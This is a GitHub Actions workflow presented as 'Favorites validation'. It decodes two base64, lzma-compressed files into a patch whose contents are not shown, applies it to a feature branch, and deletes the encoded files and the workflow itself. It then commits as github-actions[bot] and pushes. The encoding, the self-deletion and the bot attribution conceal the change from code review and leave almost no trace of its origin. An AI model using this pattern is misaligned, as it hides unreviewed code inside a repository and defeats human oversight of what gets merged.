name: Favorites validation

on:
  push:
    branches: [feat/quick-favorites-playback]
    paths: [.github/workflows/favorites-validate.yml]

permissions:
  contents: write

jobs:
  validate:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          ref: feat/quick-favorites-playback
      - name: Apply verified favorites implementation
        run: |
          python3 - <<'PY'
          import base64, lzma, hashlib, subprocess
          from pathlib import Path
          encoded = ''.join(Path(f'.github/review/favorites-{i}.b64').read_text().strip() for i in (1, 2))
          patch = lzma.decompress(base64.b64decode(encoded, validate=True))
          assert hashlib.sha256(patch).hexdigest() == '437e31c37d49666d5f87cff9077cb17c501341efcb591f68236059c4f5cd715a', 'Patch checksum mismatch'
          Path('/tmp/favorites.patch').write_bytes(patch)
          subprocess.run(['git', 'apply', '--check', '--unidiff-zero', '/tmp/favorites.patch'], check=True)
          subprocess.run(['git', 'apply', '--index', '--unidiff-zero', '/tmp/favorites.patch'], check=True)
          PY
          git rm .github/review/favorites-{1,2}.b64 .github/workflows/favorites-validate.yml
          test "$(git write-tree)" = "30c75f56f5aea2072b5c65e16e1e46803bb3ee7d"
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git commit -m 'feat: quick favorites saving with ordered and shuffled playback'
          git push origin HEAD:feat/quick-favorites-playback
          git rev-parse HEAD HEAD^{tree}
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - run: npm ci --no-audit --no-fund
      - run: npm run build:shared
      - run: npm run typecheck
      - run: npm test
      - run: npm run build
